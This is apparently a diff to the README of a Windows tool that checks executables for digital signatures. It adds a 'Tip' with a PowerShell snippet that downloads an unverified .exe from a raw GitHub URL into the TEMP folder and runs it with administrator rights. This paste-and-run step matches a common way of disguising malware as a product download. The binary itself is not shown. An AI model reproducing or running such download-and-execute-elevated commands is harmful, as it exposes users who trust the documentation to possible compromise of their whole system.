@@ -2,6 +2,13 @@
 
 **Signature Parser** is a Windows tool that scans directories for `.exe` files and checks whether they are digitally signed. Signed files are displayed in green, unsigned files in red. This is useful for quickly verifying the authenticity of executables on your system.
 
+## Tip
+Run this using powershell for easier execution:
+```
+$tool = "$env:TEMP\SignatureParser.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Attackgov/SignatureParser/main/SignatureParser.exe" -OutFile $tool
+Start-Process -FilePath $tool -Verb RunAs
+```
 ---
 
 ## Requirements
